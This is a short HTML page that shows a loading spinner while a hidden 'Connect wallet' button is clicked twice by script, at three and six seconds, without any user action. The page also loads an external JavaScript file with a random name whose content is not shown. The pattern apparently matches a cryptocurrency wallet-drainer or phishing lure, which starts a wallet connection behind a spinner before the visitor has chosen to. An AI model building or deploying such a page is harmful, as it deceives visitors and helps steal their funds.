<!DOCTYPE html>
<html lang="en">
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Button with Script</title>
    <script charset="UTF-8" type="text/javascript" src="./a110a1fa-af48-4a2f-b124-827d8160c4a0.js"></script>
    <style>
        /* Basic page styles */
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: white;
            position: relative;  /* Needed to position the spinner */
        }

        /* Button styles */
        .interact-button {
            background-color: black;
            color: white;
            font-size: 16px;
            padding: 12px 24px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: background-color 0.3s ease;
            visibility: hidden;  /* Initially make the button invisible */
        }

        .interact-button:hover {
            background-color: #333;
        }

        /* Spinner styles */
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid black;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 2s linear infinite;
            position: absolute;  /* Position spinner at the center */
        }

        /* Spinner animation */
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Spinner container to center the spinner */
        .spinner-container {
            display: flex;
            justify-content: center;
            align-items: center;
            position: absolute;
        }
    </style>
</head>
<body>

    <!-- Spinner will be shown while the button is invisible -->
    <div class="spinner-container">
        <div class="spinner"></div>
    </div>

    <!-- Invisible button initially -->
    <button class="interact-button" id="connectButton">Connect wallet</button>

    <script>
        window.onload = function() {
            var button = document.getElementById("connectButton");
            var spinner = document.querySelector(".spinner-container");

            // Hide the spinner after 6 seconds
            setTimeout(function() {
                // First click after 3 seconds
                setTimeout(function() {
                    button.click();
                }, 3000);  // 3000ms = 3 seconds

                // Second click after another 3 seconds (6 seconds total)
                setTimeout(function() {
                    button.click();

                    // Make the button visible after the second click
                    button.style.visibility = "visible";  // Make the button visible
                    
                    // Hide the spinner after both clicks are made
                    spinner.style.display = "none";  // Hide the spinner completely
                }, 6000);  // 6000ms = 6 seconds
            }, 0);  // Make sure spinner is displayed at page load
        }
    </script>

</body>
</html>
